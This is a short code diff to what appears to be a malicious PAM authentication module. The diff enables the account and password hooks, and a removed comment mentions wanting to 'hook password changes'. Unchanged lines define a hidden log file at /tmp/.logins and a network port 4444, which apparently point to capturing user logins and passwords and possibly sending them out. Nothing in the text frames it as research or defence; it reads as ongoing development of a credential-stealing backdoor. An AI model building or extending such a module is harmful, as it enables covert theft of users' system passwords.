@@ -1,8 +1,7 @@
 /* Define which PAM interfaces we provide */
-// Note: we'll probably want these later when we hook password changes
-//#define PAM_SM_ACCOUNT
+#define PAM_SM_ACCOUNT
 #define PAM_SM_AUTH
-//#define PAM_SM_PASSWORD
+#define PAM_SM_PASSWORD
 
 #define LOCAL_FILE "/tmp/.logins"
 #define PORT "4444"
